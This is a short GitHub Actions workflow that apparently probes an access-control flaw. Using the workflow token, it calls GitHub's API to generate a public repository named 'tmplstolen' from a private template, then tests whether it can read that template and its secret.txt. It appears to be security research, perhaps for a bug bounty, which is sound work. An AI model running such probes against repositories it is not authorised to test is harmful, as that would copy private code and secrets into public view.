name: tmplprobe
on: workflow_dispatch
jobs:
  q:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - env:
          TK: ${{ github.token }}
        run: |
          set +e
          echo "=== bot generating a repo FROM a private template it cannot read ==="
          curl -s -o /tmp/g.json -w "  POST /repos/h1-scyoon/tmplpriv/generate -> %{http_code}\n" -X POST \
            -H "Authorization: token $TK" -H "Accept: application/vnd.github+json" \
            https://api.github.com/repos/h1-scyoon/tmplpriv/generate \
            -d "{\"owner\":\"h1-scyoon\",\"name\":\"tmplstolen\",\"private\":false}"
          head -c 300 /tmp/g.json; echo
          echo "=== can the bot even read the template? ==="
          curl -s -o /dev/null -w "  GET template -> %{http_code}\n" -H "Authorization: token $TK" https://api.github.com/repos/h1-scyoon/tmplpriv
          curl -s -o /dev/null -w "  GET template secret.txt -> %{http_code}\n" -H "Authorization: token $TK" https://api.github.com/repos/h1-scyoon/tmplpriv/contents/secret.txt
